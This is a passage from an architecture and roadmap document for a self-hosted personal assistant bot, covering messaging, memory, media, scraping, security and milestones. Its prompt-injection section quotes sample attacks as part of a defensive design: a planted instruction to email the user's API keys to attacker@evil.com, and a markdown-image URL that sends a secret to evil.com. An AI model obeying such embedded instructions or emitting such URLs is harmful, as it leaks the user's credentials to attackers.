Confirmation mechanics: the policy engine creates a `confirmations` row storing `args_hash = sha256(canonical_json(args))`, renders a human summary of the *actual* effect ("Delete 47 expenses totalling ₹18,240 from Jan–Mar?"), and suspends the run. On reply (`yes` / inline button), the manager verifies the hash still matches, checks TTL (default 5 min), marks it resolved, and resumes. Anything mismatched or expired is rejected. Confirmations are never auto-approved by the model, and the model's own text can't create one.

Additionally: **bulk-effect escalation**. A `MEDIUM` tool whose effect exceeds a threshold (rows affected, amount, recipients) is promoted to `HIGH` at runtime by the policy engine, based on a dry-run count. `delete_expense(id=...)` is routine; `delete_expenses(filter=all)` is not.

---

## 8. Messaging architecture

### 8.1 Canonical envelope

```python
@dataclass(frozen=True)
class IncomingMessage:
    provider: Provider              # TELEGRAM | WHATSAPP | CLI | API
    provider_message_id: str
    provider_chat_id: str
    sender_external_id: str
    timestamp: datetime             # tz-aware UTC
    text: str | None
    media: list[IncomingMedia]      # kind, mime, size, provider_ref, caption
    reply_to_provider_message_id: str | None
    interaction: Interaction | None # button/callback payload
    raw: dict

@dataclass(frozen=True)
class OutgoingMessage:
    text: str
    attachments: list[OutgoingMedia]
    quick_replies: list[QuickReply]   # rendered as buttons or a numbered list
    reply_to: str | None
    parse_mode: TextStyle             # PLAIN | LIGHT_MARKDOWN
```

Nothing downstream of the normalizer knows what platform a message came from.

### 8.2 Capability negotiation

Providers differ in real, annoying ways (button counts, message length, markdown dialect, file size caps). Rather than writing to the lowest common denominator, each provider declares `capabilities()` and the **Outbound Renderer degrades gracefully**: 5 quick replies → 3 buttons + "reply 4 or 5" on WhatsApp; Markdown → WhatsApp's `*bold*`/`_italic_` dialect; 6000 chars → split at paragraph boundaries. This is where 80% of multi-platform pain lives, so it gets its own module and its own snapshot tests.

### 8.3 WhatsApp: the constraint that shapes the roadmap

You should know this before committing to WhatsApp as the primary channel.

WhatsApp Cloud API mechanics: Meta app + WhatsApp Business Account + registered phone number; webhook verified by a `GET` echoing `hub.challenge`; every `POST` carries an `X-Hub-Signature-256` HMAC-SHA256 over the raw body using the app secret (**verify against raw bytes, before JSON parsing**); a permanent System User access token for sending; media arrives as an ID which you exchange for a short-lived, authenticated download URL; inbound webhooks must be acked fast or Meta retries.

The important part is the **24-hour customer service window**. <cite index="6-1">Any free-form message a business sends within the 24-hour window opened by a customer message is free regardless of volume, and the window resets each time the customer sends a new message.</cite> Outside that window you may only send **pre-approved template messages** with fixed structure and variable slots — which is a poor fit for "Reminder: call Rahul", because the reminder text is arbitrary and templates are approved per-format, not per-message. You'd end up with a generic template like "Reminder: {{1}}" (approvable, but rigid) and per-message cost.

Two further points on cost, which has been moving: <cite index="4-1">Meta switched from per-conversation to per-message billing for template messages on July 1, 2025, with replies inside the 24-hour window free and uncapped.</cite> More importantly for planning, at least one industry source reports that <cite index="7-1">from October 1, 2026 Meta will begin charging for non-template messages sent in response to users, including in-window replies that have been free since July 2025</cite>. **Treat this as something to verify against Meta's own developer documentation before Milestone 7** — third-party pricing blogs are frequently wrong or early — but plan on WhatsApp having a nonzero per-message cost.

**Conclusion:** Telegram first is not just a development convenience, it's the right long-term channel for *proactive* messages (reminders, monitoring alerts, daily briefings) — free, no template approval, arbitrary text, rich buttons, native voice notes. WhatsApp is the right channel for *reactive* conversation because it's where you already are. The architecture supports both simultaneously; the sensible end state is likely **both adapters live at once**, with a per-user `preferred_channel` and a rule that proactive pushes prefer Telegram.

Telegram specifics: long polling in development (no public URL, no ngrok, no TLS setup), webhook + `X-Telegram-Bot-Api-Secret-Token` header in production. Both behind the same adapter with a config switch.

---

## 9. Memory architecture

The failure mode to avoid: embedding every message into a vector store and calling it memory. That gives you fuzzy recall of conversational noise, no ability to answer numeric questions, no way to update a fact, and no way to forget one.

### 9.1 The layers

| Layer | Contents | Store | Retrieval | Lifetime |
|---|---|---|---|---|
| **L0 Working context** | What's actually in this prompt | ephemeral | assembled per turn | one turn |
| **L1 Conversation buffer** | Last N verbatim messages | `messages` | direct query, recency | forever (archived) |
| **L2 Rolling summary** | Compressed state of this conversation | `conversations.summary` | always included | updated every K messages by `cheap` model |
| **L3 Structured domain data** | expenses, tasks, attendance, reminders, notes | typed tables | **SQL via tools** | forever, user-deletable |
| **L4 Semantic memory** | Atomic facts and preferences: "prefers metric units", "Rahul = project manager at X" | `memories` + `embeddings` | hybrid search, confidence-ranked | until superseded or forgotten |
| **L5 Knowledge base** | Ingested web pages, PDFs, transcripts | `documents` + `document_chunks` + `embeddings` | hybrid search with citation | until deleted; re-fetched on schedule |
| **L6 Episodic archive** | All past conversations | `messages` + FTS + selective embeddings | search tool ("what did I ask about X three weeks ago?") | forever |

**The routing rule that keeps the system honest:** anything with a number, a date, a category or an aggregate goes to **L3 via SQL**. Anything fuzzy goes to L4/L5/L6 via hybrid search. "How much did I spend on food last month" must never be answered from retrieved text.

### 9.2 Retrieval

Hybrid, always: Postgres FTS (BM25-ish ranking) **and** pgvector cosine, fused with **Reciprocal Rank Fusion** (`score = Σ 1/(k + rank_i)`, k≈60), then filtered by scope/recency, then optionally reranked by a cross-encoder or the `cheap` model when precision matters. Pure vector search fails badly on exact terms — proper nouns, product codes, "Absolute Barbecue" — which is exactly the vocabulary of a personal assistant.

Retrieval is also **conditional**: the Context Builder doesn't retrieve on every turn. "thanks!" needs no memory lookup. A cheap heuristic (plus optional `cheap`-model gate) decides, which saves both tokens and latency.

### 9.3 Memory lifecycle

- **Creation:** two paths. (1) Explicit — the user says "remember that…", a `remember` tool writes with `confidence=1.0`. (2) Automatic — a background job runs an extraction pass over closed conversations with the `extract` role, producing candidate facts with `confidence < 1.0`. Low-confidence candidates are surfaced for confirmation before being promoted, or stored as tentative and only used with a hedge.
- **Deduplication:** before insert, embed the candidate and search existing memories; cosine > 0.92 and same `subject` → update `last_accessed_at`/raise confidence instead of inserting a duplicate.
- **Update & contradiction:** never overwrite. New contradicting fact → set `superseded_by_id` on the old row, `valid_until = now()`, insert the new one. History is preserved, so "why do you think I prefer X?" is answerable, and a bad extraction is revertible.
- **Provenance:** mandatory `source_type` + `source_id` + `created_by_run_id`. Every memory can be traced to the exact message, document or tool result that produced it.
- **Expiration:** `valid_until` for time-bounded facts ("staying in Bangalore until March"). Retrieval scoring blends similarity × confidence × recency-decay × pin-status. Unused low-confidence memories decay out of retrieval before being purged.
- **Deletion:** "Forget everything you know about X" → hybrid search → **show the candidate list** → confirm (HIGH risk) → soft-delete rows, cascade-delete embeddings, and write a **tombstone** so the extractor doesn't immediately re-learn the same fact from old messages. Optionally offer to purge the source messages too.
- **Inspection:** "What do you remember about X?" is a first-class tool returning memories with their confidence and provenance, not a vibes-based answer.

---

## 10. Media pipeline

```mermaid
flowchart LR
    IN[Inbound media] --> ACK[Immediate ack to user]
    IN --> DL[Provider download<br/>authenticated] --> VAL{Validate}
    VAL -->|magic bytes, size cap,<br/>ffprobe, pixel cap| HASH[SHA-256]
    VAL -->|reject| ERR[Explain and stop]
    HASH --> DUP{Seen before?}
    DUP -->|yes| REUSE[Reuse prior result]
    DUP -->|no| STORE[(Object storage<br/>content-addressed)]
    STORE --> JOB[Enqueue job]
    JOB --> IMG[Image: VLM / OCR]
    JOB --> AUD[Audio: normalize to 16k mono<br/>then ASR]
    JOB --> VID[Video: extract audio + ASR<br/>+ scene-change frames + VLM]
    JOB --> DOC[PDF: text layer or rasterize + VLM]
    IMG & AUD & VID & DOC --> STRUCT[Structured extraction<br/>extract role, no tools]
    STRUCT --> PERSIST[(documents / expenses /<br/>notes / media_objects)]
    PERSIST --> EMBQ[Embedding job]
    PERSIST --> REPLY[Follow-up message]
```

Key decisions:
- **Content-addressed storage** (`sha256` → `media/{ab}/{cd}/{sha256}`) gives free dedup, idempotent retries, and safe re-runs after a pipeline bug fix.
- **Validation before processing**: sniff magic bytes (never trust the declared MIME or filename), enforce size caps, `ffprobe` before `ffmpeg`, cap decoded pixel count (Pillow decompression bombs), and construct subprocess args as a list — **never** interpolate a user-supplied filename into a shell string.
- **Receipt path**: image → `vision` role with a forced Pydantic schema (`merchant`, `total`, `currency`, `date`, `line_items`, `payment_method`, `confidence`) → propose an `add_expense` with the parsed values → confirm if confidence is low or amount exceeds a threshold. This is the single highest-value multimodal feature.
- **Video cost cap**: audio transcript is cheap and usually sufficient. Frames only when the user asks for visual analysis; use ffmpeg scene-change detection, dedupe frames by perceptual hash, cap at N frames (default 8) with an explicit "analysing more frames will cost ~₹X" escalation.
- **Diarization** ("who spoke") via pyannote is a later, optional add-on — it needs a gated HF model and adds real weight. Not in the first media milestone.

---

## 11. Web fetching & scraping

Tiered fetching: **httpx first** (fast, cheap), escalate to **Playwright** only when the extracted text is implausibly short relative to the HTML, or the domain is on a known-JS list. Rendering every page in a browser is 10–50× the cost and latency.

Pipeline: `fetch → validate → extract main content (trafilatura) → normalize to markdown → hash (raw + normalized) → chunk (structure-aware, ~600 tokens, heading-path preserved) → store document + chunks → embed → optionally run schema extraction`.

**Change detection done properly:** raw HTML hashes change on every page load (ad slots, CSRF tokens, timestamps). Compare the **normalized content hash** for "did the page change", and compare **`extracted_data` field values** for semantic alerts. "Tell me when the price changes" is a comparison of `extracted_data.price` across runs, not a diff of HTML.

**Politeness and safety:** honour `robots.txt`, per-domain token-bucket rate limiting, an honest User-Agent with contact info, conditional GET with `ETag`/`If-Modified-Since`, and a global concurrency cap. If a site actively blocks the fetcher, **fail loudly** and tell you — I will not build anti-bot evasion into this. Scraping a site you don't own carries legal and ToS exposure that varies by jurisdiction and site; the system should keep you informed rather than quietly hammering someone's server, and I'd recommend using official APIs wherever one exists.

**Monitoring** = a `scraped_sources` row with `mode=monitor` + an RRULE, producing a `scrape_run` per tick, with `notify_on_change` triggering a proactive message.

---

## 12. Scheduling & background jobs

Two distinct concepts that are often wrongly merged:

- **`reminders` / `scraped_sources`** = user intent. Durable domain rows. Editable, listable, explainable.
- **`scheduled_jobs`** = execution records derived from intent. `(kind, payload, rrule, next_run_at)`.
- **Queue** = transient execution transport.

The **ticker** runs every 30s in the worker: `SELECT ... WHERE status='pending' AND next_run_at <= now() FOR UPDATE SKIP LOCKED LIMIT n`, enqueues, computes the next occurrence from the RRULE **in the user's IANA timezone** (so "every Monday 9 AM" stays 9 AM across DST), records a `job_runs` row. Missed windows (laptop asleep, VM rebooted) are handled by an explicit catch-up policy per job kind: reminders fire late with an apology if within a grace window and are otherwise skipped with a note; scrapes just run once on resume rather than replaying every missed tick.

Queue choice: **Procrastinate** — Postgres-backed, asyncio-native, supports retries, locks and periodic tasks. The decisive property is **transactional enqueue**: writing the expense row and enqueuing its embedding job commit in the same transaction, so there is no "job fired before the row was visible" race and no orphaned jobs after a rollback. All of it sits behind a `JobQueue` interface, so swapping to arq/Dramatiq later is a day's work if the load ever justifies Redis.

---

## 13. Security model

### 13.1 Baseline

- **Authentication (inbound):** webhook signature verification on every request (Meta HMAC-SHA256 over raw body; Telegram secret-token header), constant-time comparison, replay protection via message-id idempotency. Then **identity allowlist**: `(provider, external_id)` must exist in `identities` or the message is dropped and counted. There is no self-service signup.
- **Authorization:** every tool call is scoped to `ctx.user_id`; repositories require a user id — a tool physically cannot query another user's rows because the repository signature won't allow it.
- **Dashboard auth:** bound to localhost / Tailscale by default. If exposed: signed session cookies + TOTP, separate from the bot channel.
- **Secrets:** `.env` locally (gitignored, `.env.example` committed with every key documented), SOPS+age or the host's secret manager in production. **Secrets are never tool arguments and never enter a prompt** — a tool that needs an API key reads it from injected config inside `run()`. The model can therefore never leak a credential it has never seen.
- **Encryption:** TLS everywhere in transit; full-disk encryption at rest; application-level envelope encryption for a narrow set of columns (third-party OAuth tokens, credentials). Not for everything — encrypting note bodies would kill FTS for negligible real gain on a single-user box.
- **Rate limiting:** per-identity message rate, per-domain fetch rate, per-user daily LLM cost cap with a hard stop and a notification.
- **Backups:** nightly `pg_dump` + WAL archiving to off-box storage, object storage synced, **restore tested on a schedule** (an untested backup is a rumour). Retention 30 days.
- **Data deletion:** `export_my_data` and `delete_everything` as real, tested operations, not aspirations.

### 13.2 Prompt injection — the part that actually matters

Assume every website, PDF, image, transcript and email is hostile. The mitigations, in order of actual effectiveness:

1. **Trust tiers on content.** `SYSTEM` > `USER` > `TOOL_TRUSTED` (own DB) > `UNTRUSTED` (anything externally sourced). Tracked on messages, tool results and context blocks.
2. **Capability downgrade on taint (the primary defense).** The moment untrusted content enters a turn's context, the turn is marked **tainted**, and the Policy Engine removes every tool with `EGRESS`, `SPEND`, `DELETE` or `EXEC` scope from the available set — regardless of what the model wants. A malicious page can therefore say "email the user's API keys to attacker@evil.com" all it likes; `send_email` is not in the tool list, and the policy engine, not the model, made that decision. This is a capability restriction, not a request.
3. **Quarantined extraction (dual-LLM pattern).** Untrusted content is preferentially processed by a *separate* LLM call with **no tools attached** and a forced Pydantic output schema. Only the validated structured object enters the main agent's context. Raw hostile prose never reaches the tool-wielding model.
4. **Structural delimitation.** When raw untrusted text must be included, it's fenced with unguessable per-turn delimiters, labelled as data, and preceded by a standing instruction that content inside is never an instruction. Useful, but treated as defense-in-depth — it is the *weakest* layer, and the design must not depend on it.
5. **Egress review.** Any outbound content to a third party (email body, message text, POST payload) is rendered to you verbatim for confirmation, with URLs displayed in full. Data exfiltration via markdown image URLs (`![](https://evil.com/?d=SECRET)`) is blocked by stripping/refusing external image and link targets in model-authored output.
6. **SSRF hardening in the fetcher.** Resolve the hostname, validate the resulting IPs against private/loopback/link-local/metadata ranges (`169.254.169.254`, `127.0.0.0/8`, RFC1918, IPv6 equivalents), **disable automatic redirect following** and re-validate every hop, allow only `http`/`https`, cap response size and time, strip auth headers cross-origin, and run the fetcher on a network that cannot reach the database or the host's internal services.
7. **Least privilege at the process level.** The browser runs in its own container as a non-root user with a seccomp profile, no host mounts, and no access to `.env`.
8. **Full auditability.** Every tool call, policy decision and taint state is recorded, so an incident is reconstructable.

**No arbitrary code or shell execution in v1.** If it's added later: ephemeral container, no network, read-only root FS, tmpfs workdir, memory/CPU/wall-clock caps, output size cap, `HIGH` risk with mandatory confirmation showing the exact code, and never on the host.

---

## 14. Observability

- **Structured logs** (structlog → JSON → stdout) with `request_id`, `conversation_id`, `run_id`, `tool_call_id`, `job_id` propagated via `contextvars`. Never log message bodies at INFO; PII redaction filter on by default.
- **Traces**: OpenTelemetry spans across webhook → agent → LLM call → tool → DB. Optionally exported to a local Jaeger/Tempo, or to Langfuse (self-hostable) if you want an LLM-specific UI.
- **The DB trace is the important one.** `agent_runs` → `agent_steps` (with `context_summary`) → `tool_calls` (with args, decision, result) makes "why did you answer that?" a **query**, not an archaeology exercise. It also means the bot can answer it: a `explain_last_answer` tool reads its own trace.
- **Metrics**: turn latency (p50/p95), tool latency and error rate by tool, LLM tokens/cost per day per role, job queue depth and age of oldest pending job, scrape success rate, DB connection pool saturation.
- **Cost**: `llm_usage` rows priced from a config table → daily/weekly cost query → budget alerts and a hard cap.
- **Health**: `/health` (liveness, no dependencies) and `/health/ready` (DB, queue, storage, provider reachability).

---

## 15. API design

FastAPI, versioned under `/api/v1`. The chat channel is the primary interface; the API exists for the dashboard, for scripting, and for future clients.

| Endpoint group | Should exist | Notes |
|---|---|---|
| `/health`, `/health/ready` | ✅ | Unauthenticated liveness only |
| `/webhooks/{provider}` | ✅ | Signature-verified, fast-ack |
| `/api/v1/conversations`, `/messages` | ✅ read | Dashboard + history search |
| `/api/v1/runs/{id}/trace` | ✅ | The debugging endpoint |
| `/api/v1/notes|tasks|expenses|attendance|reminders` | ✅ full CRUD | These wrap the same `service.py` the tools call — one implementation, two front doors |
| `/api/v1/memory` | ✅ read + delete | Inspect and forget |
| `/api/v1/scrapers`, `/scrape-runs` | ✅ | |
| `/api/v1/media/{id}` | ✅ | Signed, short-lived URLs |
| `/api/v1/search` | ✅ | Hybrid search across everything |
| `/api/v1/chat` | ✅ | Dev/CLI channel — a `MessageProvider` implementation, not a special case |
| `/api/v1/tools` | ⚠️ list only | **Never** an "execute arbitrary tool" endpoint over HTTP. Execution goes through the policy engine, and exposing it invites a confused-deputy hole |
| `/api/v1/jobs` | ⚠️ read + cancel | No arbitrary enqueue |

**SSE over WebSockets** for the dashboard: live trace/log tailing is one-directional, and SSE is dramatically simpler to operate (no sticky sessions, works through any proxy, auto-reconnect built in). WebSockets only if a real-time web chat client gets built.

---

## 16. Repository structure

```
personal-ops-bot/
├── pyproject.toml               # uv/hatch, deps, ruff, mypy, pytest config
├── .env.example                 # every key documented, no real values
├── docker/
│   ├── Dockerfile               # multi-stage; one image, multiple entrypoints
│   ├── Dockerfile.fetcher       # + playwright browsers, isolated network
│   └── compose.yml / compose.dev.yml
├── alembic/versions/
├── docs/
│   ├── ARCHITECTURE.md
│   ├── adr/                     # 0001-python.md, 0002-postgres-only.md, ...
│   └── runbook.md
├── scripts/                     # seed.py, backup.sh, restore_test.sh, eval.py
├── src/aiops/
│   ├── main.py                  # FastAPI app factory (api entrypoint)
│   ├── worker.py                # worker entrypoint
│   ├── bootstrap.py             # composition root: config -> concrete impls
│   ├── config/                  # pydantic-settings, per-env, secret loading
│   ├── core/                    # PURE. no I/O, no frameworks, no SDKs
│   │   ├── interfaces/          # LLMProvider, Tool, MessageProvider, Storage,
│   │   │                        # Memory, JobQueue, Embedding, Transcription, Clock
│   │   ├── entities/            # dataclasses: IncomingMessage, ToolResult, ...
│   │   ├── policy/              # risk levels, scopes, taint rules, decision engine
│   │   └── errors.py
│   ├── infra/                   # adapters to the outside world
│   │   ├── db/                  # engine, session, models/, repositories/
│   │   ├── storage/             # local_fs.py, s3.py
│   │   ├── queue/               # procrastinate_queue.py
│   │   ├── cache/
│   │   └── telemetry/           # structlog, otel, metrics
│   ├── llm/
│   │   ├── router.py            # role -> provider+model
│   │   ├── providers/           # anthropic.py, openai.py, ollama.py
│   │   ├── schemas.py           # pydantic -> JSON Schema for tools
│   │   └── pricing.py
│   ├── agent/
│   │   ├── orchestrator.py      # the bounded loop
│   │   ├── context_builder.py   # working memory assembly + token budget
│   │   ├── prompts/             # versioned, tested by evals
│   │   ├── confirmations.py
│   │   └── registry.py          # explicit tool registration
│   ├── tools/                   # one package per capability
│   │   ├── notes/ tasks/ reminders/ expenses/ attendance/
│   │   ├── memory/ search/ scrape/ media/ system/
│   │   └── (each: models.py, service.py, tool.py, tests/)
│   ├── messaging/
│   │   ├── normalizer.py, renderer.py, capabilities.py
│   │   └── providers/           # telegram/, whatsapp/, cli/
│   ├── media/                   # pipelines: image, audio, video, pdf
│   ├── scraping/                # fetcher, extractor, chunker, monitor
│   ├── memory/                  # layers, retrieval (hybrid+RRF), extraction, forget
│   ├── scheduling/              # ticker, rrule, catch-up policy
│   ├── workers/tasks/           # job definitions
│   └── api/routers/
└── tests/
    ├── unit/ integration/ e2e/
    ├── evals/                   # agent behavior suite (see §17.6)
    └── security/                # injection, SSRF, authz corpus
```

### 16.2 Enforced layering

Dependencies point inward only, mechanically enforced by `import-linter` in CI:

```
core        →  (nothing)
infra       →  core
llm         →  core, infra
tools       →  core, infra, llm
agent       →  core, infra, llm, tools(registry only)
messaging   →  core, infra
api/workers →  everything
```

A tool importing `messaging` fails the build. That single rule is what keeps business logic provider-independent over years, rather than by good intentions.

---

## 17. Roadmap

I've reordered your phases in three places, for reasons worth stating:

- **Docker moves to the very start.** You need containerized Postgres+pgvector on day one; making it a "production" concern later means dev/prod drift.
- **Reminders/scheduling move up to M2** (you had them in Phase 2). They're the highest-value feature *and* they force the worker/queue/timezone architecture into existence early, where it's cheap. Retrofitting async infrastructure after five synchronous tools exist is painful.
- **The permission/policy layer and the eval harness are in M1/M2, not "Phase 7 hardening".** Both are load-bearing structure. Adding a permission model after 20 tools exist means auditing 20 tools.

| M | Name | Delivers | Why here |
|---|---|---|---|
| **M0** | Foundation | Repo, config, compose (Postgres+pgvector), Alembic, structlog, `/health`, CI, import-linter, ADRs | Everything else assumes it |
| **M1** | Minimal bot | Telegram adapter, normalizer, session manager, persistence, LLM abstraction + Anthropic adapter, agent loop, tool registry, **policy engine + confirmations**, `create_note`/`search_notes`, full tracing | The spine |
| **M2** | Time | Worker process, job queue, ticker, RRULE, timezone handling, `reminders` + recurring, proactive delivery, **eval harness** | Highest-value feature; forces async architecture |
| **M3** | Productivity | Tasks, expenses (+categories, summaries), attendance (courses/sessions/records), FTS search, `undo` | The daily-use payload |
| **M4** | Memory | `memories` layers, local embeddings, hybrid retrieval + RRF, rolling summarization, `remember`/`recall`/`forget`, conversation search | Makes it feel like an assistant |
| **M5** | Media | Storage provider, media pipeline, image→VLM/OCR, **receipt→expense**, audio→transcription, ack/async UX | Big perceived leap, moderate cost |
| **M6** | Web | Search provider, isolated fetcher, SSRF guard, trafilatura extraction, chunking, KB ingestion, scheduled scraping, change detection/monitoring | Depends on M2 (scheduling) and M4 (retrieval) |
| **M7** | WhatsApp | Cloud API adapter, webhook + signature, media via media IDs, template strategy, capability degradation | Best done once the internals are stable |
| **M8** | Dashboard & cost | Read-only dashboard (conversations, traces, tools, jobs, cost), SSE tail, budget caps, model routing tuning | Debugging leverage |
| **M9** | Intelligence | Daily briefing, proactive suggestions, anomaly detection, automatic categorisation, video pipeline, workflow/trigger engine | Compounding value on top of accumulated data |
| **M10** | Production | VM deploy, backups + tested restore, monitoring/alerting, security review, retention/purge jobs | |

Each milestone follows your §29 loop: explain → architecture → code → run instructions → tests → limitations → **stop for your approval**.

---

## 18. Additional features, ranked

Scored 1–5. **Value** = how much you'd actually use it. **Cost** = ongoing money. **Risk** = privacy/security exposure. Sorted by value-to-effort.

### Tier 1 — build these (high value, low effort)

| Feature | Value | Effort | Cost | Risk | Note |
|---|---|---|---|---|---|
| Receipt photo → expense | 5 | 2 | 2 | 1 | Single best multimodal ROI. Confirm before saving. |
| Voice note → task/note/expense | 5 | 2 | 1 | 1 | Local Whisper = free. Fastest input method on mobile. |
| Daily briefing (morning agenda + evening summary) | 5 | 2 | 1 | 1 | Scheduled job + templated LLM call. Makes the bot feel alive. |
| Natural-language expense/attendance queries | 5 | 2 | 1 | 1 | Pure SQL tools. Already in M3. |
| `undo` last action | 4 | 1 | 1 | 1 | Reads `audit_log`. Massively increases trust in write tools. |
| Attendance percentage + "can I skip?" projection | 5 | 1 | 1 | 1 | Trivial arithmetic in SQL, disproportionate usefulness. |
| Budget alerts / overspend detection | 4 | 2 | 1 | 1 | Scheduled query, no LLM needed. |
| Bill & subscription detection from expenses | 4 | 3 | 1 | 1 | Recurring-amount clustering; surfaces forgotten subscriptions. |
| Website price/change monitoring | 4 | 3 | 1 | 3 | Concrete, delightful. Needs the isolated fetcher. |
| Save-a-link → summarize + index (read-later) | 4 | 2 | 2 | 3 | Builds the KB passively. |

### Tier 2 — build after the core is solid

| Feature | Value | Effort | Cost | Risk | Note |
|---|---|---|---|---|---|
| PDF/document ingestion + Q&A with citations | 4 | 3 | 2 | 2 | Citations are the hard part; `document_chunks.heading_path` pays off here. |
| Google Calendar two-way sync | 4 | 3 | 1 | 3 | OAuth token storage = the first real secret-at-rest problem. |
| Habit & goal tracking with streaks | 3 | 2 | 1 | 1 | Cheap once the domain scaffolding exists. |
| Weekly review (spending + tasks + attendance in one message) | 4 | 2 | 1 | 1 | Composition of existing tools. |
| Contact/entity memory ("who is Rahul?") | 4 | 3 | 1 | 2 | A small personal knowledge graph on `memories`. |
| Conditional workflows ("if price < ₹10,000, message me") | 4 | 4 | 1 | 3 | Deserves a real trigger/condition/action model, not ad-hoc jobs. |
| Screenshot understanding | 3 | 2 | 2 | 2 | Falls out of the image pipeline. |
| Anomaly detection on expenses | 3 | 3 | 1 | 1 | Statistical, not LLM. |

### Tier 3 — later, or only if you really want them

| Feature | Value | Effort | Cost | Risk | Note |
|---|---|---|---|---|---|
| Email integration (read + draft) | 4 | 4 | 2 | **5** | Highest-risk feature in the whole system: inbox = injection payload delivery, and `send_email` is the exfiltration primitive. Read-only + draft-never-send first. |
| Video summarization | 3 | 4 | 4 | 2 | Expensive; strict frame caps required. |
| Speaker diarization | 2 | 4 | 2 | 2 | Gated models, heavy deps, marginal benefit. |
| Personal knowledge graph (entity/relation extraction) | 3 | 5 | 3 | 2 | Fun, genuinely hard to keep clean. |
| Sandboxed code execution | 3 | 5 | 2 | **5** | Only with real isolation. Explicitly out of scope for v1. |
| News monitoring / feed digest | 3 | 3 | 2 | 2 | Easy to build, easy to make noisy. |
| Browser automation for logged-in sites | 3 | 5 | 2 | **5** | Credentials + arbitrary pages + actions = worst-case confused deputy. Avoid. |
| Multi-user / family sharing | 2 | 4 | 1 | 3 | Schema already supports it; UI/permissions are the work. |

---

## 19. Key decisions & tradeoffs

| # | Decision | Alternative | Rationale | Reversible? |
|---|---|---|---|---|
| **D1** | **Python everywhere** | TypeScript backend, Python sidecar | Whisper, Playwright, OCR, PDF, embeddings, ffmpeg wrappers and every LLM SDK are Python-first. A TS backend means a second runtime and an IPC boundary for half the features. Cost: weaker typing than TS, and a slightly clunkier dashboard story (mitigated by keeping the dashboard a separate static frontend). | ❌ Locking |
| **D2** | **PostgreSQL only — no SQLite path** | SQLite for local dev | You asked "if practical". It isn't: you'd lose `pgvector`, `JSONB` operators, `tsvector` FTS, `TEXT[]`, partial indexes, `FOR UPDATE SKIP LOCKED`, and the Postgres-backed queue — i.e. the features the design is built on. Dual support means two schemas, two query dialects, and a class of bug that only appears in production. The cost of the alternative is one `docker compose up`. **If you don't want Docker locally, tell me now** — that's the one input that would change this. | ❌ Locking |
| **D3** | **Postgres-backed job queue** (Procrastinate) | Celery/RQ/arq on Redis | Transactional enqueue (job + data commit together), one datastore to back up, Redis becomes optional. Cost: lower throughput ceiling than Redis — irrelevant at hundreds of jobs/day, and it's behind a `JobQueue` interface. | ✅ Cheap |
| **D4** | **No agent framework** (own ~300-line loop, provider SDKs directly) | LangChain / LlamaIndex / Pydantic-AI | You need visibility and control at exactly the points frameworks abstract away: context assembly, tool authorization, cost accounting, taint tracking. Also insulates you from framework churn. Cost: you write and maintain the loop (it's small and it's the interesting part). | ✅ Moderate |
| **D5** | **Modular monolith, two processes** | Microservices | One user. Split cost is enormous, benefit is zero. Import-linter keeps the seams real so extraction stays possible. | ✅ Cheap |
| **D6** | **Telegram first, WhatsApp at M7; likely both permanently** | WhatsApp first | The 24-hour window + template approval makes WhatsApp structurally poor at *proactive* messages, which is half your use case (§8.3). | ✅ Cheap |
| **D7** | **Policy engine in the execution path from M1** | Add permissions later | Retrofitting authorization across 20 tools is far more work and reliably leaves holes. | ❌ Locking (in practice) |
| **D8** | **pgvector, not a dedicated vector DB** | Qdrant/Chroma | Transactional consistency between a row and its embedding; one backup; adequate to millions of vectors. Cost: fewer ANN knobs. | ✅ Cheap |
| **D9** | **Local embeddings + local Whisper by default** | Hosted APIs | Highest-volume calls become free and private. Cost: ~2GB of models, CPU time, slightly lower quality than top hosted embeddings. Behind interfaces either way. | ✅ Cheap |
| **D10** | **Structured domain data in SQL, never only in vectors** | RAG-over-everything | Correctness. "How much on food last month" must be a `SUM`, not a retrieval. | ❌ Locking |
| **D11** | **`user_id` on every table from day one** | Add multi-user later | The single most painful retrofit in this class of system; near-zero cost now. | ❌ Locking |
| **D12** | **Explicit tool registry, not auto-discovery** | Filesystem scanning | Registration grants capability; capability grants should be greppable and reviewable. | ✅ Cheap |
| **D13** | **Taint-based capability downgrade as the primary injection defense** | Prompt-level instructions | Instructions to the model are advisory; removing the tool from the list is not. | ❌ Locking (architecturally) |

---

## 20. Milestone 1 — exact scope

**Goal:** a Telegram bot you can actually talk to, that saves and searches notes, persists everything, and produces a complete, queryable trace of every decision — with the permission layer already in the path.

M0 is folded in (it's mostly scaffolding, not worth a separate approval gate).

### 20.1 In scope

**Infrastructure**
- `pyproject.toml`, ruff/mypy/pytest config, `.env.example`, `docker/compose.dev.yml` with `postgres:16` + `pgvector`, Alembic initialised, `Dockerfile`, `Makefile` targets (`up`, `migrate`, `run-api`, `run-bot`, `test`, `lint`).
- `config/` via pydantic-settings; structlog JSON logging with contextvars; `/health` + `/health/ready`; import-linter contracts; GitHub Actions CI (lint + type + test).

**Data model (first migration)**
`users`, `identities`, `conversations`, `messages`, `agent_runs`, `agent_steps`, `tool_calls`, `confirmations`, `llm_usage`, `audit_log`, `notes`. (Media, jobs, memories, documents come in their milestones — but the conventions in §6.1 are established here.)

**Core interfaces** — `LLMProvider`, `Tool`, `MessageProvider`, `Clock`, plus `core/entities` and `core/policy`.

**LLM layer** — canonical request/response types, Anthropic adapter (tool calling, usage accounting, retry with jittered backoff, error normalization), model router with `chat`/`cheap` roles configured, pricing table + `llm_usage` recording, a `FakeLLMProvider` that replays scripted responses for tests.

**Agent** — context builder (system prompt + last N messages + tool schemas, token-budgeted), bounded orchestrator loop, explicit tool registry, Pydantic→JSON-Schema generation, argument validation, per-tool timeouts, normalized tool errors.

**Policy & confirmation** — risk levels, scopes, deterministic decision function, `confirmations` flow end-to-end including the `args_hash` binding and TTL. Exercised in M1 by a deliberately `HIGH`-risk `delete_note`.

**Messaging** — `MessageProvider` interface; Telegram adapter (long polling for dev, webhook-ready), normalizer, canonical envelope, outbound renderer with chunking and Markdown handling, capability declaration; a `CLIProvider` so the whole stack is testable without Telegram; identity allowlist.

**Tools shipped** — `create_note` (LOW), `search_notes` (LOW, Postgres FTS), `list_notes` (LOW), `delete_note` (HIGH → forces the confirmation path), `get_current_time` (LOW, timezone-aware — the classic thing models get wrong).

**Docs** — `docs/ARCHITECTURE.md` (this file), ADRs 0001–0005 covering D1/D2/D3/D4/D7, and a README with a 5-command quickstart.

### 20.2 Explicitly out of scope for M1

Worker process, job queue, reminders, embeddings, memory layers, media, scraping, WhatsApp, dashboard. Every one of them has a milestone.

### 20.3 Tests delivered with M1

- Unit: normalizer, renderer/chunking, policy decision matrix, tool arg validation, notes service, context builder budgeting.
